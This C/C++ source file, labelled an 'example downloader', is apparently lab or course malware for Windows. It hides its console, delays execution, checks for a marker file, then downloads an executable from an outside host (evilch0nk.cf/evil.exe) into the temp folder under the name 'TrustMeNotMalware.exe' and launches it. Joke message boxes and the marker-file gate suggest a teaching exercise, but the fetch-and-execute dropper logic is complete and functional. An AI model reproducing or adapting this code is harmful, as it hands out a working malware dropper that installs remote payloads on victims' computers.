#include <urlmon.h>
#include <windows.h>
#include <tchar.h>
#include <wininet.h>
#include <fileapi.h>
#include <shlwapi.h>
// Example downloader. 

#define CHONKY_PATH "C:\\malware\\ch0nky.txt"

BOOL FileExists(LPCSTR szPath)
{
  DWORD dwAttrib = GetFileAttributesA(szPath);

  return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}


void ChonkyCheck(){
     if (FileExists(CHONKY_PATH)){
        return;  
     } else{
         while (true){
             MessageBoxW(NULL, L"For a good time: https://www.youtube.com/watch?v=dQw4w9WgXcQ", L"GO AWAY!", MB_OK);
             }
            exit(0);
     }
}

int _tmain(){
    FreeConsole();
    Sleep(60000);
    ChonkyCheck();
    
    
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    const wchar_t* URL = L"http://evilch0nk.cf/evil.exe";
    const wchar_t* malName= L"TrustMeNotMalware.exe";
    wchar_t buffer[MAX_PATH ];
    PathCombineW(buffer, tempPath, malName );
    
    STARTUPINFO si;
	PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);

    MessageBoxW(NULL, L"Click me!", L"Definetly not a virus", MB_OK);
    DeleteUrlCacheEntryW(URL);
    //std::wcout << L"Downloading malware to " << buffer << std::endl;
    auto status = URLDownloadToFileW(NULL,URL, buffer, 0 , NULL );
    if (SUCCEEDED(status)){

        /*
                CreateProcessW(
        LPCWSTR               lpApplicationName,
        LPWSTR                lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCWSTR               lpCurrentDirectory,
        LPSTARTUPINFOW        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );
        */
       // we dont care about any of this for now, since we don't care about where this information gets directed 
       MessageBoxW(NULL, L"Infect your computer?", L"Definetly not a virus", MB_OK);
        if (!CreateProcessW(
            nullptr, (LPWSTR) buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr,  &si, &pi)){
        //    std::wcout << GetLastError() << std::endl;
            CloseHandle(pi.hProcess);
       
        }
        

    } else{
    }
    return 0; 
}